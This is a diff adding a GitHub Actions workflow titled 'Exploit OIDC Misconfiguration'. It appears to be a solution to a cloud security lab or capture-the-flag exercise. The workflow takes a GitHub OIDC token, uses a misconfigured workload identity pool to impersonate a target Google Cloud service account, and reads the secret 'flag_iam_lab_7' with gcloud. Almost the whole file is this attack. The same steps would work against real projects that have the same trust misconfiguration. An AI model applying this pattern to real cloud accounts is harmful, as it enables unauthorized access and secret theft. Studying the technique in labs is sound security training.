@@ -1,0 +1,29 @@
+name: Exploit OIDC Misconfiguration
+
+on:
+  workflow_dispatch: 
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write  
+      contents: read
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Authenticate to Google Cloud
+      uses: google-github-actions/auth@v1
+      with:
+        workload_identity_provider: "projects/gcp-labs-vmz8d4uh/locations/global/workloadIdentityPools/iam-lab-7-gh-pool/providers/iam-lab-7-gh-pool-oidc-provider"
+        service_account: "iam-lab-7-target@gcp-labs-vmz8d4uh.iam.gserviceaccount.com"
+
+    - name: Set up Google Cloud SDK
+      uses: google-github-actions/setup-gcloud@v1
+      with:
+        project_id: "gcp-labs-vmz8d4uh"
+
+    - name: Test Google Cloud access
+      run: |
+        gcloud secrets versions access latest --secret="flag_iam_lab_7" --project=gcp-labs-vmz8d4uh
